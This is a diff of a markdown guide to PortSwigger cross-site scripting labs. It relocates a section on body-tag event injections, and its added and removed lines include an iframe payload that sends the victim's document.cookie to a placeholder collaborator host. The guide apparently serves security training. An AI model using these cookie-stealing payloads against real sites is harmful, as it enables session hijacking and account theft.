@@ -315,7 +315,6 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 [Bypass Blocked Tags](#bypass-blocked-tags)  
 [XSS Assign protocol](#xss-assign-protocol)  
 [Custom Tags not Blocked](#custom-tags-not-blocked)  
-[XSS Tags & Events](#xss-tags--events)  
 [OnHashChange](#onhashchange)  
 [Reflected String XSS](#reflected-string-xss)  
 [Reflected String Extra Escape](#reflected-string-extra-escape)  
@@ -373,7 +372,27 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 ```  
 
 [PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
-    
+
+>In below sample the tag **Body** and event **onresize** is the only allowed, providing an injection to perform XSS.  
+
+```JavaScript
+?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```  
+
+>This example show the **Body** and event **onpopstate** is not blocked.  
+  
+```JavaScript
+?search=%22%3E%3Cbody%20onpopstate=print()>
+```  
+
+[PortSwigger Cheat-sheet XSS Example: onpopstate event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
+
+>Below JavaScript is hosted on exploit server and then deliver to victim. The `code` is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.  
+
+```JavaScript
+<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
+```  
+
 ### Bypass Blocked Tags   
   
 >Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above [methodology](#identify-allowed-tags). This payload steal my own session cookie as POC.  
@@ -433,30 +452,6 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
   
 [PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)  
   
-### XSS Tags & Events  
-
->This section give guide to ***identify*** reflected XSS in a **search** function on a target and how to determine the HTML tags and events attributes not blocked.  
-  
->The tag **Body** and event **onresize** is the only allowed, providing an injection to perform XSS.  
-
-```JavaScript
-?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
-```  
-
->Again the **Body** and event **onpopstate** is not blocked.  
-  
-```JavaScript
-?search=%22%3E%3Cbody%20onpopstate=print()>
-```  
-
-[PortSwigger Cheat-sheet XSS Example: onpopstate event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
-
->Below JavaScript is hosted on exploit server and then deliver to victim. It is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.  
-
-```JavaScript
-<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
-```  
-
 ### OnHashChange  
 
 >Below iframe uses **hash** ``` # ``` character at end of the URL to trigger the **OnHashChange** XSS cookie stealer.  
@@ -478,8 +473,7 @@ location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location
 ![Hashchange](images/hashchange.png)  
 
 [PortSwigger Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)  
-
-
+  
 [Crypto-Cat: DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)  
 
 ### Reflected String XSS  
